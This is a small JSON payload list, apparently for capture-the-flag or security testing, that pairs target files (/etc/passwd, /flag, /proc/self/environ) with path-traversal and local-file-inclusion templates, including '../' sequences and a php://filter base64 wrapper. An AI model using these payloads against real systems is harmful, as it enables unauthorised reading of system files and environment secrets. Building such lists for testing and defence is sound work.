{
  "targets": [
    "/etc/passwd",
    "/flag",
    "/flag.txt",
    "/root/flag.txt",
    "/proc/self/environ"
  ],
  "traversals": [
    "{file}",
    "../../{file}",
    "../../../{file}",
    "php://filter/convert.base64-encode/resource={file}",
    "file:///etc/passwd"
  ]
}